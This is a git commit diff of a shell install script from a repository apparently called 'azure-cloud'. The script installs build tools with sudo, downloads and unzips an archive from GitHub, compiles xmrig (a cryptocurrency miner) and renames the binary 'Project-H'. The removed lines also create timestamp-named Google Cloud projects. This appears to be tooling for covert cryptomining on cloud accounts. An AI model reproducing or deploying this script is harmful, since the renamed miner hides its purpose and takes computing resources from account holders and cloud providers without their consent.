051676332e403f2acce6c99a2e685e0af0c65108
U117A <33190250+U117A@users.noreply.github.com>
2020-08-22 10:20:44 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,18 +1,20 @@
-sudo apt-get update
+#!/bin/bash
 
-sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
-sudo wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
-sudo unzip AAA.zip
-#sudo rm -rf "$HOME"/AAA #IF****
-#sudo mv AAA "$HOME"
-sudo rm -rf AAA.zip
+if [ ! -e "AAA" ]; then
 
-cd AAA
-mkdir build
-cd build
-cmake ..
-make
-sudo mv xmrig Project-H
+	sudo apt-get update
+	sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
+	sudo wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
+	sudo unzip AAA.zip
+	#sudo rm -rf "$HOME"/AAA #IF****
+	#sudo mv AAA "$HOME"
+	sudo rm -rf AAA.zip
 
-project="p$(date +"%d%m%Y%H%M%S")
-gcloud config set project $project
+	cd AAA
+	mkdir build
+	cd build
+	cmake ..
+	make
+	sudo mv xmrig Project-H
+
+fi
